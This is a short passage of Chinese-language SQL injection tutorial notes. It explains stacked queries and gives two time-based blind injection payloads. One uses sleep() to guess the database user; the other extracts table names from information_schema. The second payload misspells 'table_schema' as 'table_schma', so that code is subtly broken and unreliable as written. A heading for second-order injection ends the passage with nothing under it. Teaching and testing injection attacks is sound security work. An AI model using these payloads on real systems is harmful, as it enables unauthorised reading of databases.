## 堆叠查询
堆叠查询就是指可以执行多条语句，多语句之间以分号隔开。即第一条语句是系统自己的语句，当系统执行完自己的sql语句的时候，就会执行第二条语句，而这条语句则是我们的注入语句。这样子数据库就执行了我们自己的sql语句。
如：

```sql
'; select if(substr(user,1,1)='r',sleep(5),1)%23
```


1. 利用堆叠注入获取数据
```
';select if(substr((select table_name from information_schema.tables where table_schma=database() limit 0,1),1,1)='e',sleep(5),1)%23
```


## 二次注入攻击

